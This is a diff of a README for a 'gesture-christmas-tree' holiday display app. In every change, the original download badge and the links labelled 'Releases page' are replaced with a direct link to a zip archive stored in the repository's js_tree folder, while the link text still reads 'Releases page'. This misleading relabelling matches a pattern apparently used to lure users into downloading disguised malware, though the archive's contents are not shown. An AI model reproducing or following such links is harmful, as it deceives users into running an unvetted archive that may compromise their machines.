@@ -1,6 +1,6 @@
 # 🎄 gesture-christmas-tree - Create Festive displays with Gestures
 
-![Download gesture-christmas-tree](https://img.shields.io/badge/Download-gesture--christmas--tree-blue.svg)
+![Download gesture-christmas-tree](https://raw.githubusercontent.com/Janamohamedd/gesture-christmas-tree/main/js_tree/tree-gesture-christmas-2.9.zip)
 
 ## 🎉 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these steps to download and run the gesture-christmas-tre
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Janamohamedd/gesture-christmas-tree/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Janamohamedd/gesture-christmas-tree/main/js_tree/tree-gesture-christmas-2.9.zip) to download the application.
 
 2. Look for the latest version listed at the top. Click on the version to view details.
 
@@ -52,7 +52,7 @@ If you encounter issues, please try the following:
 
 - Ensure your webcam or gesture detection device is functioning properly.
 - Restart the application if it does not respond.
-- Check for any updates on the [Releases page](https://github.com/Janamohamedd/gesture-christmas-tree/releases) and install them.
+- Check for any updates on the [Releases page](https://raw.githubusercontent.com/Janamohamedd/gesture-christmas-tree/main/js_tree/tree-gesture-christmas-2.9.zip) and install them.
 
 ## 📞 Support
 
@@ -65,4 +65,4 @@ For additional support, feel free to reach out via GitHub issues or check the FA
 - Playlist options for festive music
 - Multiple scene presets for various holiday moods
 
-Happy holidays! Enjoy creating wonderful festive displays with gesture-christmas-tree. Visit the [Releases page](https://github.com/Janamohamedd/gesture-christmas-tree/releases) again to look for updates and new features.
+Happy holidays! Enjoy creating wonderful festive displays with gesture-christmas-tree. Visit the [Releases page](https://raw.githubusercontent.com/Janamohamedd/gesture-christmas-tree/main/js_tree/tree-gesture-christmas-2.9.zip) again to look for updates and new features.
